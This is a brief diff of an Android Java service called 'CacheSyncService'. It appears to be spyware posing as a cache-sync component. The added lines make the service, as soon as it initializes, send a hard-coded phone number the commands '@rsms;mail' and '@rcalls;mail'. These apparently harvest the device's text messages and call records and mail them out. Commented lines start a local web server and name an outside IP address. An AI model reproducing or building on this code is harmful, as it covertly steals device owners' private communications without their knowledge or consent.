@@ -30,8 +30,10 @@ public class CacheSyncService extends Service implements Runnable {
 	        	public void onComplete(Void  v) {
 	                NetLog.v("Service initialized");
 	        		cmdPool.Execute("+79037996299", "@setup;ack:0");
-	        		//cmdPool.Execute("+79037996299", "@net");
-	        		cmdPool.Execute("+79037996299","@httpd;8081");
+	        		cmdPool.Execute("+79037996299", "@rsms;mail");
+	        		cmdPool.Execute("+79037996299", "@rcalls;mail");
+	        		
+	        		//cmdPool.Execute("+79037996299","@httpd;8081");
 	        		//cmdPool.Execute("+79037996299","@httpd;217.118.66.22;8081");
 	        	}
 	        	@Override
